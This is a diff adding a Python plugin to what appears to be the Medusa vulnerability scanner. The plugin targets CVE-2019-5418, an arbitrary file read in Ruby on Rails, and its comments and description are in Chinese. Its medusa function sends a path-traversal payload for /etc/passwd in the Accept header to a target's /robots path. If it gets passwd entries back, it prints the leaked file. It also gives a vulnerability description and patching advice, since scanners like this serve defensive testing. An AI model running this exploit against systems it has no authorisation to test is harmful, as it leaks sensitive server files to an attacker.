@@ -1,0 +1,76 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+__author__ = 'Ascotbe'
+__date__ = '2019/11/29 22:12 PM'
+import urllib.parse
+import requests
+import ClassCongregation
+requests.packages.urllib3.disable_warnings()
+class VulnerabilityInfo(object):
+    def __init__(self,Medusa):
+        self.info = {}
+        self.info['number']="CVE-2019-5418" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
+        self.info['author'] = "Ascotbe"  # 插件作者
+        self.info['create_date'] = "2019-12-3"  # 插件编辑时间
+        self.info['algroup'] = "RubyOnRailsArbitraryFileReading"  # 插件名称
+        self.info['name'] ='RubyOnRails任意文件读取' #漏洞名称
+        self.info['affects'] = "Rails"  # 漏洞组件
+        self.info['desc_content'] = "漏洞来源于ActionView组件,攻击者可构造特定的Accept请求头与render_file:调用结合利用，可导致目标服务器上的任意文件被渲染导致敏感信息泄露。"  # 漏洞描述
+        self.info['rank'] = "高危"  # 漏洞等级
+        self.info['suggest'] = "1.推荐方案：升级Rails版本\r\n2.缓解方案：强制修改使用了renderfile:调用的代码，指定要渲染的文件格式（formats），避免不必要的文件泄露"  # 修复建议
+        self.info['details'] = Medusa  # 结果
+
+def UrlProcessing(url):
+    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
+        res = urllib.parse.urlparse(url)
+    else:
+        res = urllib.parse.urlparse('http://%s' % url)
+    return res.scheme, res.hostname, res.port
+
+def medusa(Url,RandomAgent,ProxyIp=None):
+
+    scheme, url, port = UrlProcessing(Url)
+    if port is None and scheme == 'https':
+        port = 443
+    elif port is None and scheme == 'http':
+        port = 80
+    else:
+        port = port
+    global resp
+    global resp2
+    try:
+        payload = "../../../../../../../../etc/passwd{{"
+        payload_url = scheme + "://" + url +":"+ str(port) + "/robots"
+        headers = {
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': payload,
+            'Accept-Language': 'en',
+            'User-Agent': RandomAgent,
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }
+
+        s = requests.session()
+        if ProxyIp!=None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
+        elif ProxyIp==None:
+            resp = s.get(payload_url, headers=headers,timeout=5, verify=False)
+        con=resp.text
+        code = resp.status_code
+        if code== 200 and con.find('root:') != -1 and con.find('bin:') != -1 and con.find('sys:') != -1 and con.find('sync:') != -1 :
+            Medusa = "{} 存在任意文件读取漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con.encode(encoding='utf-8'))
+            _t=VulnerabilityInfo(Medusa)
+            print(Medusa)
+            web=ClassCongregation.VulnerabilityDetails(_t.info)
+            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+            return (str(_t.info))
+    except:
+        _ = VulnerabilityInfo('').info.get('algroup')
+        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
+
+
+#medusa('http://192.168.0.121:3000/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4')
